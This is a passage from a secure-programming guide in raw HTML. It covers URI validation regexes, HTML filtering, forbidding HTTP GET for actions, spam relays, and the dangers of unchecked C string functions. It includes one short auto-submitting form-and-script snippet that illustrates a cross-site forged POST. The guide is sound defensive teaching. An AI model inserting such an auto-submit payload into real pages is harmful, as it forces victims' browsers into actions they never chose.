but Microsoft ignored this part of the standard and even requires the
use of the underscore in some circumstances, so you probably should allow it.
Also, there&#8217;s been a great deal of work on supporting international
characters in DNS names, which is not further discussed here.</P
></LI
><LI
><P
>Path:
Permitting a path is usually okay, but unfortunately some applications
use part of the path as query data, creating an opening we&#8217;ll discuss next.
Also, paths are allowed to contain phrases like <SPAN
CLASS="QUOTE"
>&#8220;..&#8221;</SPAN
>, which can expose
private data in a poorly-written web server;
this is less a problem than it once was and really should be fixed
by the web server.
Since it&#8217;s only the phrase <SPAN
CLASS="QUOTE"
>&#8220;..&#8221;</SPAN
> that&#8217;s special, it&#8217;s reasonable to
look at paths (and possibly query data) and forbid <SPAN
CLASS="QUOTE"
>&#8220;../&#8221;</SPAN
> as a content.
However, if your validator permits URL escapes, this can be difficult;
now you need to prevent versions where some of these characters are
escaped, and may also have to deal with various <SPAN
CLASS="QUOTE"
>&#8220;illegal&#8221;</SPAN
> character
encodings of these characters as well.</P
></LI
><LI
><P
>Query:
Query formats (beginning with "?") can be a security risk
because some query formats actually cause actions to occur on the serving end.
They shouldn&#8217;t, and your applications shouldn&#8217;t, as discussed in
<A
HREF="#AVOID-GET-NON-QUERIES"
>Section 5.14</A
> for more information.
However, we have to acknowledge the reality as a serious problem.
In addition, many web sites are actually <SPAN
CLASS="QUOTE"
>&#8220;redirectors&#8221;</SPAN
> - they take a
parameter specifying where the user should be redirected, and send back
a command redirecting the user to the new location.
If an attacker references such sites and provides
a more dangerous URI as the redirection value, and the
browser blithely obeys the redirection, this could be a problem.
Again, the user&#8217;s browser should be more careful, but not all user
browsers are sufficiently cautious.
Also, many web applications have vulnerabilities that can be
exploited with certain query values, but in general this is hard to
prevent.
The official URI specifications don&#8217;t sanction the <SPAN
CLASS="QUOTE"
>&#8220;+&#8221;</SPAN
> (plus) character,
but in practice the <SPAN
CLASS="QUOTE"
>&#8220;+&#8221;</SPAN
> character often represents the space character.</P
></LI
><LI
><P
>Fragment:
Fragments basically locate a portion of a document; I&#8217;m unaware of
an attack based on fragments as long as the syntax is legal, but the
legality of its syntax does need checking.
Otherwise, an attacker might be able to insert a character such as the
double-quote (") and prematurely end the URI (foiling any checking).</P
></LI
><LI
><P
>URL escapes:
URL escapes are useful because they can represent arbitrary 8-bit
characters; they can also be very dangerous for the same reasons.
In particular, URL escapes can represent control characters, which many
poorly-written web applications are vulnerable to.
In fact, with or without URL escapes, many web applications are vulnerable
to certain characters (such as backslash, ampersand, etc.), but again
this is difficult to generalize.</P
></LI
><LI
><P
>Relative URIs:
Relative URIs should be reasonably safe (if you manage the web site well),
although in some applications there&#8217;s no good reason to allow them either.</P
></LI
></UL
>
Of course, there is a trade-off with simplicity as well.
Simple patterns are easier to understand, but
they aren&#8217;t very refined (so they tend to be too permissive or
too restrictive, even more than a refined pattern).
Complex patterns can be more exact, but they are more likely to have
errors, require more performance to use, and can be hard to
implement in some circumstances.</P
><P
>Here&#8217;s my suggestion for a <SPAN
CLASS="QUOTE"
>&#8220;simple mostly safe&#8221;</SPAN
> URI pattern which is
very simple and can be implemented <SPAN
CLASS="QUOTE"
>&#8220;by hand&#8221;</SPAN
> or through a regular
expression; permit the following pattern:
<TABLE
BORDER="0"
BGCOLOR="#E0E0E0"
WIDTH="100%"
><TR
><TD
><FONT
COLOR="#000000"
><PRE
CLASS="PROGRAMLISTING"
>(http|ftp|https)://[-A-Za-z0-9._/]+</PRE
></FONT
></TD
></TR
></TABLE
></P
><P
>This pattern doesn&#8217;t permit many potentially dangerous capabilities
such as queries, fragments, ports, or relative URIs,
and it only permits a few schemes.
It prevents the use of the <SPAN
CLASS="QUOTE"
>&#8220;%&#8221;</SPAN
> character, which is used in URL escapes
and can be used to specify characters that the server may not be
prepared to handle.
Since it doesn&#8217;t permit either <SPAN
CLASS="QUOTE"
>&#8220;:&#8221;</SPAN
> or URL escapes, it doesn&#8217;t permit
specifying port numbers, and even using it to redirect to a
more dangerous URI would be difficult (due to the lack of the escape character).
It also prevents the use of a number of other characters; again, many
poorly-designed web applications can&#8217;t handle a number of
<SPAN
CLASS="QUOTE"
>&#8220;unexpected&#8221;</SPAN
> characters.</P
><P
>Even this <SPAN
CLASS="QUOTE"
>&#8220;mostly safe&#8221;</SPAN
> URI permits
a number of questionable URIs, such as
subdirectories (via <SPAN
CLASS="QUOTE"
>&#8220;/&#8221;</SPAN
>) and attempts to move up directories (via `..'');
illegal queries of this kind should be caught by the server.
It permits some illegal host identifiers (e.g., <SPAN
CLASS="QUOTE"
>&#8220;20.20&#8221;</SPAN
>),
though I know of no case where this would be a security weakness.
Some web applications treat subdirectories as query data (or worse,
as command data); this is hard to prevent in general since finding
<SPAN
CLASS="QUOTE"
>&#8220;all poorly designed web applications&#8221;</SPAN
> is hopeless.
You could prevent the use of all paths, but this would make it
impossible to reference most Internet information.
The pattern also allows references to local server information
(through patterns such as "http:///", "http://localhost/", and
"http://127.0.0.1") and access to servers on an internal network;
here you&#8217;ll have to depend on the servers correctly interpreting the
resulting HTTP GET request as solely a request for information and not
a request for an action,
as recommended in <A
HREF="#AVOID-GET-NON-QUERIES"
>Section 5.14</A
>.
Since query forms aren&#8217;t permitted by this pattern, in many environments
this should be sufficient.</P
><P
>Unfortunately, the <SPAN
CLASS="QUOTE"
>&#8220;mostly safe&#8221;</SPAN
>
pattern also prevents a number of quite legitimate and useful URIs.
For example,
many web sites use the <SPAN
CLASS="QUOTE"
>&#8220;?&#8221;</SPAN
> character to identify specific documents
(e.g., articles on a news site).
The <SPAN
CLASS="QUOTE"
>&#8220;#&#8221;</SPAN
> character is useful for specifying specific sections of a document,
and permitting relative URIs can be handy in a discussion.
Various permitted characters and URL escapes aren&#8217;t included in the
<SPAN
CLASS="QUOTE"
>&#8220;mostly safe&#8221;</SPAN
> pattern.
For example, without permitting URL escapes, it&#8217;s difficult to access
many non-English pages.
If you truly need such functionality, then you can use less safe patterns,
realizing that you&#8217;re exposing your users to higher risk while
giving your users greater functionality.</P
><P
>One pattern that permits queries, but at
least limits the protocols and ports used is the following,
which I&#8217;ll call the <SPAN
CLASS="QUOTE"
>&#8220;simple somewhat safe pattern&#8221;</SPAN
>:
<TABLE
BORDER="0"
BGCOLOR="#E0E0E0"
WIDTH="100%"
><TR
><TD
><FONT
COLOR="#000000"
><PRE
CLASS="PROGRAMLISTING"
> (http|ftp|https)://[-A-Za-z0-9._]+(\/([A-Za-z0-9\-\_\.\!\~\*\'\(\)\%\?]+))*/?</PRE
></FONT
></TD
></TR
></TABLE
>
This pattern actually isn&#8217;t very smart, since it permits illegal escapes,
multiple queries, queries in ftp, and so on.
It does have the advantage of being relatively simple.</P
><P
>Creating a <SPAN
CLASS="QUOTE"
>&#8220;somewhat safe&#8221;</SPAN
> pattern that really limits URIs
to legal values is quite difficult.
Here&#8217;s my current attempt to do so, which I call
the <SPAN
CLASS="QUOTE"
>&#8220;sophisticated somewhat safe pattern&#8221;</SPAN
>, expressed in a form
where whitespace is ignored and comments are introduced with "#":

<TABLE
BORDER="0"
BGCOLOR="#E0E0E0"
WIDTH="100%"
><TR
><TD
><FONT
COLOR="#000000"
><PRE
CLASS="PROGRAMLISTING"
> (
 (
  # Handle http, https, and relative URIs:
  ((https?://([A-Za-z0-9][A-Za-z0-9\-]*(\.[A-Za-z0-9][A-Za-z0-9\-]*)*\.?))|
    ([A-Za-z0-9\-\_\.\!\~\*\'\(\)]|(%[2-9A-Fa-f][0-9a-fA-F]))+)?
  ((/([A-Za-z0-9\-\_\.\!\~\*\'\(\)]|(%[2-9A-Fa-f][0-9a-fA-F]))+)*/?) # path
   (\?(                                                              # query:
       (([A-Za-z0-9\-\_\.\!\~\*\'\(\)\+]|(%[2-9A-Fa-f][0-9a-fA-F]))+=
        ([A-Za-z0-9\-\_\.\!\~\*\'\(\)\+]|(%[2-9A-Fa-f][0-9a-fA-F]))+
        (\&#38;([A-Za-z0-9\-\_\.\!\~\*\'\(\)\+]|(%[2-9A-Fa-f][0-9a-fA-F]))+=
         ([A-Za-z0-9\-\_\.\!\~\*\'\(\)\+]|(%[2-9A-Fa-f][0-9a-fA-F]))+)*)
       |
       (([A-Za-z0-9\-\_\.\!\~\*\'\(\)\+]|(%[2-9A-Fa-f][0-9a-fA-F]))+  # isindex
       )
   ))?
   (\#([A-Za-z0-9\-\_\.\!\~\*\'\(\)\+]|(%[2-9A-Fa-f][0-9a-fA-F]))+)? # fragment
  )|
 # Handle ftp:
 (ftp://([A-Za-z0-9][A-Za-z0-9\-]*(\.[A-Za-z0-9][A-Za-z0-9\-]*)*\.?)
  ((/([A-Za-z0-9\-\_\.\!\~\*\'\(\)]|(%[2-9A-Fa-f][0-9a-fA-F]))+)*/?) # path
  (\#([A-Za-z0-9\-\_\.\!\~\*\'\(\)\+]|(%[2-9A-Fa-f][0-9a-fA-F]))+)? # fragment
  )
 )</PRE
></FONT
></TD
></TR
></TABLE
>&#13;</P
><P
>Even the sophisticated pattern shown above doesn&#8217;t forbid all illegal URIs.
For example, again, "20.20" isn&#8217;t a legal domain name, but it&#8217;s allowed
by the pattern; however, to my knowledge
this shouldn&#8217;t cause any security problems.
The sophisticated pattern forbids URL escapes that represent
control characters (e.g., %00 through $1F) - 
the smallest permitted escape value is %20 (ASCII space).
Forbidding control characters prevents some trouble, but it&#8217;s
also limiting; change "2-9" to "0-9" everywhere if you need to support sending
all control characters to arbitrary web applications.
This pattern does permit all other URL escape values in paths,
which is useful for international characters but could cause trouble
for a few systems which can&#8217;t handle it.
The pattern at least prevents spaces, linefeeds,
double-quotes, and other dangerous characters
from being in the URI, which prevents other kinds of
attacks when incorporating the URI into a generated document.
Note that the pattern permits <SPAN
CLASS="QUOTE"
>&#8220;+&#8221;</SPAN
> in many places, since in practice
the plus is often used to replace the space character
in queries and fragments.</P
><P
>Unfortunately, as noted above,
there are attacks which can work through any technique that permit query data,
and there don&#8217;t seem to be really good defenses for them once you
permit queries.
So, you could strip out the ability to use query data from the
pattern above, but permit the other forms, producing a
<SPAN
CLASS="QUOTE"
>&#8220;sophisticated mostly safe&#8221;</SPAN
> pattern:
<TABLE
BORDER="0"
BGCOLOR="#E0E0E0"
WIDTH="100%"
><TR
><TD
><FONT
COLOR="#000000"
><PRE
CLASS="PROGRAMLISTING"
> (
 (
  # Handle http, https, and relative URIs:
  ((https?://([A-Za-z0-9][A-Za-z0-9\-]*(\.[A-Za-z0-9][A-Za-z0-9\-]*)*\.?))|
    ([A-Za-z0-9\-\_\.\!\~\*\'\(\)]|(%[2-9A-Fa-f][0-9a-fA-F]))+)?
  ((/([A-Za-z0-9\-\_\.\!\~\*\'\(\)]|(%[2-9A-Fa-f][0-9a-fA-F]))+)*/?) # path
   (\#([A-Za-z0-9\-\_\.\!\~\*\'\(\)\+]|(%[2-9A-Fa-f][0-9a-fA-F]))+)? # fragment
  )|
 # Handle ftp:
 (ftp://([A-Za-z0-9][A-Za-z0-9\-]*(\.[A-Za-z0-9][A-Za-z0-9\-]*)*\.?)
  ((/([A-Za-z0-9\-\_\.\!\~\*\'\(\)]|(%[2-9A-Fa-f][0-9a-fA-F]))+)*/?) # path
  (\#([A-Za-z0-9\-\_\.\!\~\*\'\(\)\+]|(%[2-9A-Fa-f][0-9a-fA-F]))+)? # fragment
  )
 )</PRE
></FONT
></TD
></TR
></TABLE
></P
><P
>As far as I can tell, as long as these patterns are only used to check
hypertext anchors selected by the user (the "&#60;a&#62;" tag)
this approach also prevents the insertion of <SPAN
CLASS="QUOTE"
>&#8220;web bugs&#8221;</SPAN
>.
Web bugs are simply text that allow someone other
than the originating web server
of the main page to track information such as who read
the content and when they read it -
see <A
HREF="#EMBEDDED-CONTENT-BUGS"
>Section 8.7</A
> for more information.
This isn&#8217;t true if you use the &#60;img&#62; (image) tag with the same
checking rules - the image tag is loaded immediately, permitting
someone to add a <SPAN
CLASS="QUOTE"
>&#8220;web bug&#8221;</SPAN
>.
Once again, this presumes that you&#8217;re not permitting any attributes;
many attributes can be quite dangerous and pierce the security you&#8217;re
trying to provide.</P
><P
>Please note that all of these patterns require the entire URI match
the pattern.
An unfortunate fact of these patterns is that they limit the
allowable patterns in a way that forbids many useful ones
(e.g., they prevent the use of new URI schemes).
Also, none of them can prevent the very real problem that some web sites
perform more than queries when presented with a query - and some of these
web sites are internal to an organization.
As a result, no URI can really be safe until there
are no web sites that accept GET queries as an action
(see <A
HREF="#AVOID-GET-NON-QUERIES"
>Section 5.14</A
>).
For more information about legal URLs/URIs, see IETF RFC 2396;
domain name syntax is further discussed in IETF RFC 1034.</P
></DIV
><DIV
CLASS="SECT2"
><HR><H3
CLASS="SECT2"
><A
NAME="OTHER-HTML-TAGS"
>5.13.5. Other HTML tags</A
></H3
><P
>You might even consider supporting more HTML tags.
Obvious next choices are the list-oriented tags, such as
&#60;ol&#62; (ordered list),
&#60;ul&#62; (unordered list),
and &#60;li&#62; (list item).
However, after a certain point you&#8217;re really permitting
full publishing (in which case you need to trust the provider or perform more
serious checking than will be described here).
Even more importantly, every new functionality you add creates an
opportunity for error (and exploit).</P
><P
>One example would be permitting the
&#60;img&#62; (image) tag with the same URI pattern.
It turns out this is substantially less safe, because this
permits third parties to insert <SPAN
CLASS="QUOTE"
>&#8220;web bugs&#8221;</SPAN
> into the document,
identifying who read the document and when.
See <A
HREF="#EMBEDDED-CONTENT-BUGS"
>Section 8.7</A
> for more information on web bugs.</P
></DIV
><DIV
CLASS="SECT2"
><HR><H3
CLASS="SECT2"
><A
NAME="RELATED-ISSUES"
>5.13.6. Related Issues</A
></H3
><P
>Web applications should also explicitly specify the character set
(usually ISO-8859-1), and not permit other characters, if data from
untrusted users is being used.
See <A
HREF="#OUTPUT-CHARACTER-ENCODING"
>Section 9.5</A
> for more information.</P
><P
>Since filtering this kind of input is easy to get wrong, other
alternatives have been discussed as well.
One option is to ask users to use a different language, much simpler
than HTML, that you&#8217;ve designed - and you give that language very limited
functionality.
Another approach is parsing the HTML into some internal <SPAN
CLASS="QUOTE"
>&#8220;safe&#8221;</SPAN
> format,
and then translating that safe format back to HTML.</P
><P
>Filtering can be done during input, output, or both.
The CERT recommends filtering data during the output process,
just before it is rendered as part of the dynamic page.
This is because, if it is done correctly, 
this approach ensures that all dynamic content is filtered.
The CERT believes that filtering on the input side is less effective
because dynamic content can be entered into a web sites database(s) via
methods other than HTTP, and in this case,
the web server may never see the data as part of the input process.
Unless the filtering is implemented in all places where dynamic data
is entered, the data elements may still be remain tainted.</P
><P
>However, I don&#8217;t agree with CERT on this point for all cases.
The problem is that it&#8217;s just as easy to forget to filter all the output
as the input, and allowing <SPAN
CLASS="QUOTE"
>&#8220;tainted&#8221;</SPAN
> input into your system
is a disaster waiting to happen anyway.
A secure program has to filter its inputs anyway, so it&#8217;s sometimes better
to include all of these checks as part of the input filtering
(so that maintainers can see what the rules really are).
And finally, in some secure programs there are many different program
locations that may output a value, but only a very few ways and locations
where a data can be input into it;
in such cases filtering on input may be a better idea.</P
></DIV
></DIV
><DIV
CLASS="SECT1"
><HR><H2
CLASS="SECT1"
><A
NAME="AVOID-GET-NON-QUERIES"
>5.14. Forbid HTTP GET To Perform Non-Queries</A
></H2
><P
>Web-based applications using HTTP should prevent the use of
the HTTP <SPAN
CLASS="QUOTE"
>&#8220;GET&#8221;</SPAN
> or <SPAN
CLASS="QUOTE"
>&#8220;HEAD&#8221;</SPAN
> method for anything other than queries.
HTTP includes a number of different methods; the two most popular methods
used are GET and POST.
Both GET and POST can be used to transmit data from a form, but the
GET method transmits data in the URL, while the POST method
transmits data separately.</P
><P
>The security problem of using GET to perform non-queries
(such as changing data, transferring money, or signing up for a service)
is that an attacker can create a hypertext link
with a URL that includes malicious form data.
If the attacker convinces a victim to click on the link
(in the case of a hypertext link),
or even just view a page (in the case of transcluded information
such as images from HTML&#8217;s img tag), the victim
will perform a GET.
When the GET is performed,
all of the form data created by the attacker will be sent by the victim
to the link specified.
This is a cross-site malicious content attack, as discussed further in
<A
HREF="#CROSS-SITE-MALICIOUS-CONTENT"
>Section 7.16</A
>.</P
><P
>If the only action that a malicious cross-site content attack can perform is
to make the user view unexpected data, this isn&#8217;t as serious a problem.
This can still be a problem, of course, since there are some attacks
that can be made using this capability.
For example, there&#8217;s a
potential loss of privacy due to the user requesting something unexpected,
possible real-world effects from appearing to request illegal or
incriminating material, or by making the user request the information
in certain ways the information may be exposed to an attacker
in ways it normally wouldn&#8217;t be exposed.
However, even more serious effects can be caused if the malicious attacker
can cause not just data viewing, but changes in data, through
a cross-site link.</P
><P
>Typical HTTP interfaces (such as most CGI libraries) normally hide the
differences between GET and POST, since for getting data it&#8217;s useful
to treat the methods <SPAN
CLASS="QUOTE"
>&#8220;the same way.&#8221;</SPAN
>
However, for actions that actually cause something other than a data query,
check to see if the request is something other than POST;
if it is, simply display a filled-in form with the data given and ask
the user to confirm that they really mean the request.
This will prevent cross-site malicious content attacks, while still
giving users the convenience of confirming the action with
a single click.</P
><P
>Indeed, this behavior is strongly recommended by the HTTP specification.
According to the HTTP 1.1 specification (IETF RFC 2616 section 9.1.1),
<SPAN
CLASS="QUOTE"
>&#8220;the GET and HEAD methods SHOULD NOT have the significance of
taking an action other than retrieval.
These methods ought to be considered <SPAN
CLASS="QUOTE"
>&#8216;safe&#8217;</SPAN
>.
This allows user agents to represent other methods,
such as POST, PUT and DELETE, in a special way,
so that the user is made aware of the fact that a possibly
unsafe action is being requested.&#8221;</SPAN
></P
><P
>In the interest of fairness, I should note that this doesn&#8217;t
completely solve the problem, because on some browsers
(in some configurations) scripted posts can do the same thing.
For example, imagine a web browser with ECMAscript (Javascript) enabled
receiving the following HTML snippet - on some browsers, simply
displaying this HTML snippet will
automatically force the user to send a POST request to a website
chosen by the attacker, with form data defined by the attacker:
<TABLE
BORDER="0"
BGCOLOR="#E0E0E0"
WIDTH="100%"
><TR
><TD
><FONT
COLOR="#000000"
><PRE
CLASS="PROGRAMLISTING"
>  &#60;form action=http://remote/script.cgi method=post name=b&#62;
    &#60;input type=hidden name=action value="do something"&#62;
    &#60;input type=submit&#62;
  &#60;/form&#62;
  &#60;script&#62;document.b.submit()&#60;/script&#62;</PRE
></FONT
></TD
></TR
></TABLE
>
My thanks to David deVitry pointing this out.
However, although this advice doesn&#8217;t solve all problems, it&#8217;s
still worth doing.
In part, this is because the remaining problem
can be solved by smarter web browsers
(e.g., by always confirming the data before
allowing ECMAscript to send a web form) or
by web browser configuration (e.g., disabling ECMAscript).
Also, this attack doesn&#8217;t work in many cross-site scripting exploits, because
many websites don&#8217;t allow users to post <SPAN
CLASS="QUOTE"
>&#8220;script&#8221;</SPAN
> commands but do
allow arbitrary URL links.
Thus, limiting the actions a GET command can perform to queries
significantly improves web application security.</P
></DIV
><DIV
CLASS="SECT1"
><HR><H2
CLASS="SECT1"
><A
NAME="COUNTER-SPAM"
>5.15. Counter SPAM</A
></H2
><P
>Any program that can send email elsewhere, by request from the network,
can be used to transport spam.
Spam is the usual name for unsolicited bulk email (UBE) or
mass unsolicited email.
It&#8217;s also sometimes called unsolicited commercial email (UCE), though
that name is misleading - not all spam is commercial.
For a discussion of why spam is such a serious problem and more general
discussion about it,
see my essay at
<A
HREF="http://www.dwheeler.com/essays/stopspam.html"
TARGET="_top"
>http://www.dwheeler.com/essays/stopspam.html</A
>, as well as
<A
HREF="http://mail-abuse.org/"
TARGET="_top"
>http://mail-abuse.org/</A
>,
<A
HREF="http://spam.abuse.net/"
TARGET="_top"
>http://spam.abuse.net/</A
>,
<A
HREF="http://http://www.cauce.org/"
TARGET="_top"
>CAUCE</A
>, and
<A
HREF="http://www.faqs.org/rfcs/rfc2635.html"
TARGET="_top"
>IETF RFC 2635</A
>.
Spam receivers and intermediaries bear most of the cost
of spam, while the spammer spends very little to send it.
Therefore many people regard spam as a theft of service, not just some
harmless activity, and that number increases as the amount of
spam increases.</P
><P
>If your program can be used to generate email sent to others
(such as a mail transfer agent, generator of data sent by email, or
a mailing list manager),
be sure to write your program to prevent its unauthorized use as a
mail relay.
A program should usually only allow legitimate authorized users
to send email to others (e.g., those inside that company&#8217;s mail server
or those legitimately subscribed to the service).
More information about this is in
<A
HREF="http://www.faqs.org/rfcs/rfc2505.html"
TARGET="_top"
>IETF RFC 2505</A
>
Also, if you manage a mailing list, make sure that it can enforce the
rule that only subscribers can post to the list, and create a <SPAN
CLASS="QUOTE"
>&#8220;log in&#8221;</SPAN
>
feature that will make it somewhat harder for spammers to subscribe, spam, and
unsubscribe easily.</P
><P
>One way to more directly counter SPAM is to incorporate support for the
MAPS (Mail Abuse Prevention System LLC) RBL (Realtime Blackhole List),
which maintains in real-time
a list of IP addresses where SPAM is known to originate.
For more information, see
<A
HREF="http://mail-abuse.org/rbl/"
TARGET="_top"
>http://mail-abuse.org/rbl/</A
>.
Many current Mail Transfer Agents (MTAs) already support the RBL;
see their websites for how to configure them.
The usual way to use the RBL is to simply refuse to accept any requests
from IP addresses in the blackhole list;
this is harsh, but it solves the problem.
Another similar service is the Open Relay Database (ORDB) at
<A
HREF="http://ordb.org"
TARGET="_top"
>http://ordb.org</A
>, which identifies
dynamically those sites that permit open email relays
(open email relays are misconfigured email servers that allow spammers to
send email through them).
Another location for more information is
<A
HREF="http://www.spews.org"
TARGET="_top"
>SPEWS</A
>.
I believe there are other similar services as well.</P
><P
>I suggest that many systems and programs,
by default, enable spam blocking if they
can send email on to others whose identity is under control
of a remote user - and that includes MTAs.
At the least, consider this.
There are real problems with this suggestion, of course -
you might (rarely) inhibit communication with a legitimate user.
On the other hand, if you don&#8217;t block spam, then it&#8217;s likely that everyone
<EM
>else</EM
> will blackhole your system
(and thus ignore your emails).
It&#8217;s not a simple issue, because no matter what you do, some people
will not allow you to send them email.
And of course, how well do you trust the organization keeping up the
real-time blackhole list - will they add truly innocent sites to the
blackhole list, and will they remove sites from the blackhole list
once all is okay?
Thus, it becomes a trade-off - is it more important to talk to spammers
(and a few innocents as well), or is it more important to talk to
those many other systems with spam blocks
(losing those innocents who share equipment with spammers)?
Obviously, this must be configurable.
This is somewhat controversial advice, so consider your options for
your circumstance.</P
></DIV
><DIV
CLASS="SECT1"
><HR><H2
CLASS="SECT1"
><A
NAME="LIMIT-TIME"
>5.16. Limit Valid Input Time and Load Level</A
></H2
><P
>Place time-outs and load level limits, especially on incoming network data.
Otherwise, an attacker might be able to easily cause a denial of service
by constantly requesting the service.</P
></DIV
></DIV
><DIV
CLASS="CHAPTER"
><HR><H1
><A
NAME="BUFFER-OVERFLOW"
></A
>Chapter 6. Restrict Operations to Buffer Bounds (Avoid Buffer Overflow)</H1
><TABLE
BORDER="0"
WIDTH="100%"
CELLSPACING="0"
CELLPADDING="0"
CLASS="EPIGRAPH"
><TR
><TD
WIDTH="45%"
>&nbsp;</TD
><TD
WIDTH="45%"
ALIGN="LEFT"
VALIGN="TOP"
><I
><P
><I
>An enemy will overrun the land;
he will pull down your strongholds and
plunder your fortresses.</I
></P
></I
></TD
></TR
><TR
><TD
WIDTH="45%"
>&nbsp;</TD
><TD
WIDTH="45%"
ALIGN="RIGHT"
VALIGN="TOP"
><I
><SPAN
CLASS="ATTRIBUTION"
>Amos 3:11 (NIV)</SPAN
></I
></TD
></TR
></TABLE
><P
>Programs often use memory buffers to capture input and process data.
In some cases (particularly in C or C++ programs)
it may be possible to perform an operation,
but either read from or write to a memory location
that is outside of the intended boundary of the buffer.
In many cases this can lead to an extremely serious
security vulnerability.
This is such a common problem that it has a CWE identifier,
<A
HREF="http://cwe.mitre.org/data/definitions/119.html"
TARGET="_top"
>CWE-119</A
>.
Exceeding buffer bounds is a problem with a program&#8217;s internal
implementation, but it&#8217;s such a common and serious problem that
I&#8217;ve placed this information in its own chapter.</P
><P
>There are many variations of a failure to restrict operations to
buffer bounds.
A subcategory of exceeding buffer bounds is
a <EM
>buffer overflow</EM
>.
The term buffer overflow has a number of varying definitions.
For our purposes,
a buffer overflow occurs if
a program attempts to write more data in a buffer than it can hold
or write into a memory area outside the boundaries of the buffer.
A particularly common situation is writing character data beyond the
end of a buffer (through copying or generation).
A buffer overflow can occur when reading input from the user into a buffer,
but it can also occur during other kinds of processing in a program.
Buffer overflows are also called <EM
>buffer overruns</EM
>.
This subcategory is such a common problem that it has its own
CWE identifier,
<A
HREF="http://cwe.mitre.org/data/definitions/120.html"
TARGET="_top"
>CWE-120</A
>.</P
><P
>Buffer overflows are an extremely common and dangerous security flaw,
and in many cases a buffer overlow can lead immediately to an attacker
having complete control over the vulnerable program.
To give you an idea of how important this subject is,
at the CERT, 9 of 13 advisories in 1998 and at least half of
the 1999 advisories involved buffer overflows.
An informal 1999 survey on Bugtraq found that approximately 2/3 of the
respondents felt that buffer overflows were the leading cause of
system security vulnerability (the remaining respondents identified
<SPAN
CLASS="QUOTE"
>&#8220;mis-configuration&#8221;</SPAN
> as the leading cause) [Cowan 1999].
This is an old, well-known problem, yet it continues to resurface
[McGraw 2000].</P
><P
>Attacks that exploit a buffer overflow vulnerability
are often named depending on where the buffer is, e.g.,
a <SPAN
CLASS="QUOTE"
>&#8220;stack smashing&#8221;</SPAN
> attack attacks a buffer on the stack,
while a
<SPAN
CLASS="QUOTE"
>&#8220;heap smashing&#8221;</SPAN
> attack attacks a buffer on the heap
(memory that is allocated by operators such as
malloc and new).
More details can be found from Aleph1 [1996], Mudge [1995], LSD [2001],
or the Nathan P. Smith&#8217;s
<EM
>Stack Smashing Security Vulnerabilities</EM
> website at
<A
HREF="http://destroy.net/machines/security/"
TARGET="_top"
>http://destroy.net/machines/security/</A
>.
A discussion of the problem and some ways to counter them is given
by Crispin Cowan et al, 2000, at
<A
HREF="http://immunix.org/StackGuard/discex00.pdf"
TARGET="_top"
>http://immunix.org/StackGuard/discex00.pdf</A
>.
A discussion of the problem and some ways to counter them in Linux
is given by
Pierre-Alain Fayolle and Vincent Glaume
at
<A
HREF="http://www.enseirb.fr/~glaume/indexen.html"
TARGET="_top"
>http://www.enseirb.fr/~glaume/indexen.html</A
>.</P
><P
>Allowing attackers to read data beyond a buffer boundary can also result
in vulnerabilities, and this weakness has its own identifier
(<A
HREF="http://cwe.mitre.org/data/definitions/125.html"
TARGET="_top"
>CWE-125</A
>).
For example, the
<A
HREF="http://www.dwheeler.com/essays/heartbleed.html"
TARGET="_top"
>Heartbleed</A
>
vulnerability was this kind of weakness.
The Heartbleed vulnerability in OpenSSL allowed attackers to
extract critically-important data such as private keys, and then use them
(e.g., so they could impersonate trusted sites).</P
><DIV
CLASS="FIGURE"
><A
NAME="TRAIN-OVERFLOW-BUFFER"
></A
><P
><B
>Figure 6-1. A physical buffer overflow: The Montparnasse derailment of 1895</B
></P
><DIV
CLASS="MEDIAOBJECT"
><P
><IMG style="max-width:90%"
SRC="Train_wreck_at_Montparnasse_1895.jpg"
ALIGN="CENTER"></P
></DIV
></DIV
><P
>Most high-level programming languages are essentially
immune to exceeding buffer boundaries, either
because they automatically resize arrays (this applies to most
languages such as Perl), or because they normally
detect and prevent buffer overflows (e.g., Ada95).
However, the C language provides no protection against
such problems, and C++ can be easily used in ways to cause this problem too.
Assembly language and Forth also provide no protection, and some languages
that normally include such protection (e.g., C#, Ada, and Pascal) can have
this protection disabled (for performance reasons).
Even if most of your program is written in another language,
many library routines are written in C or C++,
as well as <SPAN
CLASS="QUOTE"
>&#8220;glue&#8221;</SPAN
> code to
call them, so other languages often don&#8217;t provide as complete a protection
from buffer overflows as you'd like.</P
><DIV
CLASS="SECT1"
><HR><H2
CLASS="SECT1"
><A
NAME="DANGERS-C"
>6.1. Dangers in C/C++</A
></H2
><P
>C users must avoid using dangerous functions that do not check bounds
unless they've ensured that the bounds will never get exceeded.
Functions to avoid in most cases (or ensure protection) include
the functions strcpy(3), strcat(3), sprintf(3)
(with cousin vsprintf(3)), and gets(3).
These should be replaced with functions such as strncpy(3), strncat(3),
snprintf(3), and fgets(3) respectively, but see the discussion below.
The function strlen(3) should be avoided unless you can ensure that there
will be a terminating NIL character to find.
The scanf() family (scanf(3), fscanf(3),  sscanf(3),  vscanf(3),
vsscanf(3), and vfscanf(3)) is often dangerous to use; do not use it
to send data to a string without controlling the maximum length
(the format %s is a particularly common problem).
Other dangerous functions that may permit buffer overruns (depending on their
use) include
realpath(3), getopt(3), getpass(3),
streadd(3), strecpy(3), and strtrns(3).
You must be careful with getwd(3); the buffer sent to getwd(3) must be
at least PATH_MAX bytes long.
The select(2) helper macros
FD_SET(), FD_CLR(), and FD_ISSET() do not check that the index fd
is within bounds; make sure that fd &#62;= 0 and fd &#60;= FD_SETSIZE
(this particular one has been exploited in pppd).</P
><P
>Unfortunately, snprintf()&#8217;s variants have additional problems.
Officially, snprintf() is not a standard C function in the ISO 1990
(ANSI 1989) standard, though sprintf() is,
so some very old systems do not include snprintf().
Even worse, some systems&#8217; snprintf() do not actually protect
against buffer overflows; they just call sprintf directly.
Old versions of Linux&#8217;s libc4 depended on a <SPAN
CLASS="QUOTE"
>&#8220;libbsd&#8221;</SPAN
> that did this
horrible thing, and I&#8217;m told that some old HP systems did the same.
Linux&#8217;s current version of snprintf is known to work correctly, that is, it
does actually respect the boundary requested.
The return value of snprintf() varies as well;
the Single Unix Specification (SUS) version 2
and the C99 standard differ on what is returned by snprintf().
Finally, it appears that at least some versions of
snprintf don&#8217;t guarantee that its string will end in NIL; if the
string is too long, it won&#8217;t include NIL at all.
Note that the glib library (the basis of GTK, and not the same as the
GNU C library glibc) has a g_snprintf(), which
has a consistent return semantic, always NIL-terminates, and
most importantly always respects the buffer length.</P
><P
>Of course, the problem is more than just calling string functions poorly.
Here are a few additional examples of types of buffer overflow problems,
graciously suggested by Timo Sirainen, involving manipulation of
numbers to cause buffer overflows.</P
><P
>First, there&#8217;s the problem of signedness.
If you read data that affects the buffer size,
